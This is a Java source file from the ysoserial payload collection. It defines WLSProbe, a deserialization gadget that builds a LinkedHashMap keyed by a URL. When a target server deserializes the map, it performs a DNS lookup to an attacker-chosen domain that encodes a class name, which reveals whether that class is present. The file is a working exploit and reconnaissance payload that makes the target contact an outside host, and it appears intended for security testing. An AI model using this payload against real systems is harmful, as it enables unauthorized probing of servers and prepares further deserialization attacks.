package ysoserial.payloads;

import java.io.IOException;
import java.io.*;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.*;
import java.net.*;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import java.lang.*;
import java.lang.Object;
import org.apache.commons.collections.*;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
    @PayloadTest(skip = "true")
    @Dependencies()
    @Authors({ Authors.GEBL })
    public class WLSProbe implements ObjectPayload<Object> {

        private Class getOrGenerateClass(String className) {
            Class clazz = null;
            ClassPool pool = new ClassPool(true);
            try {
                clazz = Class.forName(className);
            } catch (ClassNotFoundException e) {
                CtClass cc = pool.makeClass(className);

                try {
                    clazz = cc.toClass();
                    return clazz;
                } catch (CannotCompileException err) {
                    if (err.getCause() != null && err.getCause().getCause() instanceof SecurityException) {
                        System.err.println("Error: Classname is in protected package. Most likely a typo: " + className);
                    } else {
                        err.printStackTrace();
                    }
                }
            }
            return clazz;
        }

        public Object getObject(final String input) throws Exception {

            String[] tmp = input.split("::");
            String domain = tmp[0];
            String cls = tmp[1];

            Class clazz = getOrGenerateClass(cls);
            if (clazz == null) {
                return null;
            }

            //Avoid DNS resolution during payload creation
            //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
            URLStreamHandler handler = new SilentURLStreamHandler();

            LinkedHashMap ht = new LinkedHashMap(); // HashMap that will contain the URL

            URL u = new URL(null, "http://" + cls + "." + domain, handler); // URL to use as the Key

            ht.put("test", clazz);
            ht.put(u, domain); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

            Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

            return ht;
        }

        public static void main(final String[] args) throws Exception {
            PayloadRunner.run(WLSProbe.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }

            protected synchronized InetAddress getHostAddress(URL u) {
                return null;
            }
        }
    }
